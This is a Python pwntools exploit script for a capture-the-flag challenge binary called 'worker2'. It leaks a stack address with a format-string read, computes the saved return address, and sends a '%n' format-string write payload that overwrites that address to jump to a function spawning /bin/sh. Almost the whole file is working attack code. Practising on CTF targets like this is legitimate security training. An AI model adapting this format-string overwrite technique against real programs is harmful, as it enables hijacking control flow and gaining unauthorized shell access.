from dataclasses import dataclass
import time

import pwnlib.tubes.process as process
import pwnlib.tubes.remote as remote
import pwnlib.util.packing as packing
import pwnlib.fmtstr as fmtstr
from pwnlib.context import context

from interactive_nc import InteractiveNC
context.bits = 64
# nc = "c.unitedctf.ca"
# port = 10033
# r = remote.remote(nc,port)
r = process.process(["/mnt/c/Users/massi/Downloads/Source(1)/worker2"])


def readline(endOfLine="\n"):
    data = b""
    rec = ""
    while rec != bytes(endOfLine, "utf-8"):
        rec = r.recvn(1)
        data += rec
    return data.decode()


def readlines(number_of_lines: int, endOfLine="\n"):
    lines = []
    for _ in range(number_of_lines):
        lines += readline(endOfLine)
    return "".join(lines)


def readall():
    rec = r.recvall()
    return rec.decode()


def sendline(toSend):
    r.send(f"{toSend}\n".encode())


def sendbytes(toSend: bytes):
    r.send(toSend)   
    
interactive = InteractiveNC(r,command_prefix="!")

interactive.add_input("!b")
interactive.add_input("0")
# Leaks an address from the stack
interactive.add_input("%372$lx")
interactive.add_input("!i")
interactive.add_input("!s 2 all addr")
# Offset of the stack return address to the leaked address 
interactive.add_input("!v off 3368")
interactive.add_input("!10 addr")
interactive.add_input("!+ addr off return_addr")
# %4200224x = 0x401720 <- return_addr of exec func with /bin/sh
# %10$n = 10 <- write to the address at the 10th argument
# 12 <- padding to reach the 10th argument
interactive.add_input("!v payload %4200224x%10$n12")
interactive.add_input("!16 return_addr")
interactive.add_input("!e util.packing.p64(int(return_addr, 16))")
# append the stack return address to the payload
interactive.add_input("!a payload last_eval_res fmtstr_payload")
interactive.add_input("!d hex")
interactive.add_input("!pid")
interactive.interactive()